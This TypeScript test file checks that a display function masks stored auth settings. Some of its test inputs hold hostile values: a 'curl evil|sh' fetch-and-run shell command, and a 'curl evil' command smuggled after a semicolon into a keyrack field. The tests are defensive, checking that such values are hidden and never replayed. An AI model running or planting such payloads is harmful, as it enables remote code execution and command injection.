import { given, then, when } from 'test-fns';

import { asRadioAuthShown } from './asRadioAuthShown';

const TEST_CASES = [
  {
    description:
      'no stored auth shows as default, with the auth it resolves to',
    given: { auth: null },
    expect: { output: 'default (as-robot:via-keyrack(ehmpath))' },
  },
  {
    description: 'as-human replays, so it shows as stored',
    given: { auth: 'as-human' },
    expect: { output: 'as-human' },
  },
  {
    description:
      'an env var with a TOKEN segment replays, so it shows as stored',
    given: { auth: 'as-robot:env(GH_TOKEN)' },
    expect: { output: 'as-robot:env(GH_TOKEN)' },
  },
  {
    description: 'a planted shell auth shows its kind alone, never the command',
    given: { auth: 'as-robot:shx(curl evil|sh)' },
    expect: { output: 'as-robot:shx(…), will not replay' },
  },
  {
    description: 'an env var with no TOKEN segment shows its kind alone',
    given: { auth: 'as-robot:env(AWS_SECRET_ACCESS_KEY)' },
    expect: { output: 'as-robot:env(…), will not replay' },
  },
  {
    description: 'a keyrack owner of an odd shape shows its kind alone',
    given: { auth: 'as-robot:via-keyrack(ehmpath;curl evil)' },
    expect: { output: 'as-robot:via-keyrack(…), will not replay' },
  },
];

describe('asRadioAuthShown', () => {
  TEST_CASES.map((thisCase, index) =>
    given(`[case${index + 1}] ${thisCase.description}`, () => {
      when('[t0] the auth is shown', () => {
        then('it reads as expected', () => {
          expect(asRadioAuthShown(thisCase.given)).toEqual(
            thisCase.expect.output,
          );
        });
      });
    }),
  );
});
